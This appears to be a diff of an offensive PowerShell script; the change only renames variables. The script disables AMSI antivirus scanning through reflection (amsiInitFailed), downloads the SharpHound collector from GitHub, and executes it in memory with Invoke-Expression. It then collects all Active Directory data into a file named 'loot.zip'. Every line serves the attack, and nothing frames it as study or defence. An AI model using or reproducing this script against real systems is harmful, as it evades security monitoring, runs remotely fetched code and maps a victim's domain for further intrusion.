@@ -3,9 +3,8 @@ $amsiUtils = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
 $field = $amsiUtils.GetField("amsiInitFailed", $flags)
 $field.SetValue($null, $true)
 
-$sharphoundUrl = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1"
-$sharphoundCode = Invoke-WebRequest -Uri $sharphoundUrl -UseBasicParsing | Select-Object -ExpandProperty Content
+$code = Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -UseBasicParsing | Select-Object -ExpandProperty Content
 
-Invoke-Expression $sharphoundCode
+Invoke-Expression $code
 
 Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
